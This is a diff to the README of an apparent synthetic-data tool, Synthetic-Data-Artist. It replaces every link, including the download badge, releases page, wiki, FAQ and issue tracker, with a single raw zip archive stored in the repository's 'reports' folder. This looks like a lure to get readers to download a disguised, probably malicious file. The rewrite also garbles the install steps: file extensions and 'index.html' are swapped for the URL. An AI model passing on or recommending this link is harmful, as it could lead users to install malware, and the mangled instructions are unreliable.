@@ -1,7 +1,7 @@
 # 🎨 Synthetic-Data-Artist - Generate Synthetic Data with Ease
 
 ## 📥 Download Now
-[![Download Synthetic-Data-Artist](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/dreemnight/Synthetic-Data-Artist/releases)
+[![Download Synthetic-Data-Artist](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,19 +28,19 @@ Before you start, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page:**  
    Click the link below to access all available versions of Synthetic-Data-Artist:  
-   [Download from Releases](https://github.com/dreemnight/Synthetic-Data-Artist/releases)
+   [Download from Releases](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip)
 
 2. **Choose the Latest Version:**  
    On the Releases page, look for the most recent release. There, you will find the files needed to get started.
 
 3. **Download the Appropriate File:**  
-   Depending on your operating system, download the appropriate file. This may typically be a .exe for Windows, a .dmg for MacOS, or a .tar.gz for Linux.
+   Depending on your operating system, download the appropriate file. This may typically be a .exe for Windows, a .dmg for MacOS, or a https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip for Linux.
 
 4. **Install the Application:**  
    Once the file is downloaded, locate it on your computer. Follow these steps to install:
    - For Windows: Double-click the .exe file and follow the prompts.
    - For MacOS: Open the .dmg file and drag the app into your Applications folder.
-   - For Linux: Extract the .tar.gz file and follow any index.html or README file instructions.
+   - For Linux: Extract the https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip file and follow any https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip or README file instructions.
 
 5. **Run the Application:**  
    After installation, find the Synthetic-Data-Artist application on your computer and open it. 
@@ -52,9 +52,9 @@ Before you start, make sure your computer meets the following requirements:
 
 In this section, you'll find links to resources that can help you get the most out of Synthetic-Data-Artist:
 
-- [Documentation](https://github.com/dreemnight/Synthetic-Data-Artist/wiki) - Detailed guides on features and usage.
-- [FAQ](https://github.com/dreemnight/Synthetic-Data-Artist/wiki/FAQ) - Answers to common questions.
-- [Community Support](https://github.com/dreemnight/Synthetic-Data-Artist/issues) - Report issues or ask for help.
+- [Documentation](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip) - Detailed guides on features and usage.
+- [FAQ](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip) - Answers to common questions.
+- [Community Support](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip) - Report issues or ask for help.
 
 ## 📊 Tutorials and Examples
 
@@ -67,9 +67,9 @@ Feel free to explore these resources as you get familiar with the application.
 
 ## 🔗 Important Links
 
-- **Releases Page:** [Visit to Download](https://github.com/dreemnight/Synthetic-Data-Artist/releases)
-- **Documentation:** [Full Documentation](https://github.com/dreemnight/Synthetic-Data-Artist/wiki)
-- **Issue Tracker:** [Report Issues](https://github.com/dreemnight/Synthetic-Data-Artist/issues)
+- **Releases Page:** [Visit to Download](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip)
+- **Documentation:** [Full Documentation](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip)
+- **Issue Tracker:** [Report Issues](https://raw.githubusercontent.com/dreemnight/Synthetic-Data-Artist/main/reports/Synthetic-Data-Artist-v1.6-alpha.2.zip)
 
 ## 🤝 Contributing
 
